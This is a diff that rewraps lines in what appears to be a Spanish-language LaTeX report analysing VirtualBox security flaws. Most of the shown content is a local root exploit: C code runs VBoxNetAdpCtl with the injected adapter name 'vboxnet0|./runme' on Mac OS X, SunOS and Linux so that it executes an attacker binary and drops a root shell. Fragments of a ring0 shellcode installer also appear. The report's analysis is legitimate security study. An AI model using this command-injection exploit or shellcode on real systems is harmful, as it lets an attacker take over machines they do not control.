@@ -17,7 +17,8 @@ static bool removeAddresses(const char *pszAdapterName)
     char aszAddresses[MAX_ADDRESSES][MAX_ADDRLEN];
 
     memset(aszAddresses, 0, sizeof(aszAddresses));
-    snprintf(szCmd, sizeof(szCmd), VBOXADPCTL_IFCONFIG_PATH " %s", pszAdapterName);
+    snprintf(szCmd, sizeof(szCmd), VBOXADPCTL_IFCONFIG_PATH " %s",
+       pszAdapterName);
     FILE *fp = popen(szCmd, "r");
 
     if (!fp)
@@ -66,7 +67,8 @@ int main(int argc,char* argv[])
         exit(0);
     }
     else{
-        printf("[ No path provided, will attempt to exploit system default\n");
+        printf("[ No path provided, will attempt to exploit 
+            system default\n");
     }
     printf("[ Places a root shell in ./sh if succesful\n");
     uname(sysdetail);
@@ -79,25 +81,30 @@ int main(int argc,char* argv[])
     switch(platform){
         case 1:
             printf("[ Detected a Mac OS X target\n");
-            execle("/Applications/VirtualBox.app/Contents/MacOS/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+            execle("/Applications/VirtualBox.app/Contents/MacOS/VBoxNetAdpCtl",
+                "VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
             break;
         case 2:
             printf("[ Detected a SunOS target\n");
             if(!strncmp("i86pc",sysdetail->machine,strlen("i86pc"))){
                 printf("[ Detected SunOS is x86 platform\n");
-                execle("/opt/VirtualBox/i386/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+                execle("/opt/VirtualBox/i386/VBoxNetAdpCtl","VBoxNetAdpCtl",
+                    "vboxnet0|./runme","1::2",NULL,env);
             }
             else{
                 printf("[ Guessing SunOS is amd64 platform\n");
-                execle("/opt/VirtualBox/amd64/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+                execle("/opt/VirtualBox/amd64/VBoxNetAdpCtl","VBoxNetAdpCtl",
+                    "vboxnet0|./runme","1::2",NULL,env);
             }
             break;
         case 3:
             printf("[ Detected a Linux target\n");
-            execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+            execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl",
+                "vboxnet0|./runme","1::2",NULL,env);
             break;
         default:
-            printf("[ Unknown OSE target. Try ./%s <path>/VBoxNetAdpCtl\n",argv[0]);
+            printf("[ Unknown OSE target. Try ./%s <path>/VBoxNetAdpCtl\n",
+                argv[0]);
             break;
     }
         exit(0);
@@ -109,7 +116,8 @@ Este codigo realiza la llamada a la aplicaci'on VBoxNetAdpCtl, previo chequeo de
 En la linea
 
 \begin{verbatim}
-execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme","1::2",NULL,env);
+execle("/opt/VirtualBox/VBoxNetAdpCtl","VBoxNetAdpCtl","vboxnet0|./runme",
+    "1::2",NULL,env);
 \end{verbatim}
 
 se ve que se esta ejecutando $VBoxNetAdpCtl$ con el parametro $vboxnet0|./runme$, lo que va a resultar que el programa termine ejecutando
@@ -131,7 +139,8 @@ int checkAdapterName(const char *pcszNameIn, char *pszNameOut)
         || sscanf(pcszNameIn, "vboxnet%d", &iAdapterIndex) != 1
         || iAdapterIndex < 0 || iAdapterIndex > 99 )
     {
-        fprintf(stderr, "Setting configuration for %s is not supported.\n", pcszNameIn);
+        fprintf(stderr, "Setting configuration for %s is not supported.\n",
+            pcszNameIn);
         return ADPCTLERR_BAD_NAME;
     }
     sprintf(pszNameOut, "vboxnet%d", iAdapterIndex);
@@ -233,7 +242,8 @@ static bool InstallShellCode()
     uint32_t codesize;
 
     // Message to print from ring0
-    MessageSize = snprintf(Message, sizeof(Message), "<script>alert('ring0')</script>\n");
+    MessageSize = snprintf(Message, sizeof(Message), 
+        "<script>alert('ring0')</script>\n");
 
     CODE32("mov     esp, edi                        \n"     // Restore a usable stack
            "sub     esp, 0x50                       \n"     // Fixup stack pointer
